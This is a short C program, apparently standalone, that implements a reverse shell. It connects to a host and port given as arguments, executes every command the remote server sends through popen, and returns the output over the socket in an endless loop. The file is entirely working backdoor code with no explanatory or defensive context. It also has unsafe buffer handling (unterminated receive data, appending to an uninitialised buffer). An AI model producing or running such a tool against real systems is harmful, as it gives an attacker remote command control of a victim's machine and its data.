#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#define MAX 4000
int main(int argc, char *argv[])
{
  struct addrinfo hints, *res;
  int status;
char  outputfromserver[MAX];
char  temp [MAX];
  memset(&hints, 0, sizeof hints);
  hints.ai_family = AF_INET; // AF_INET or AF_INET6 to force version
  hints.ai_socktype = SOCK_STREAM;
  

  if ((status = getaddrinfo(argv[1], argv[2], &hints, &res)) != 0) {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
    return 1;
  }

 int sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
 connect(sockfd,res->ai_addr,res->ai_addrlen);
  while(1)
  {
       recv(sockfd, outputfromserver, MAX, 0);
       FILE *fp;   
    char path[MAX];
    fp = popen(outputfromserver, "r");
    if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    }
    while (fgets(path , MAX, fp) != NULL) {
        strcat(temp,path);
    }
pclose(fp);
send(sockfd,temp,strlen(temp),0);
memset(path,0,MAX);
memset(temp,0,MAX);
memset(outputfromserver,0,MAX);

}
  
 return 0;
}

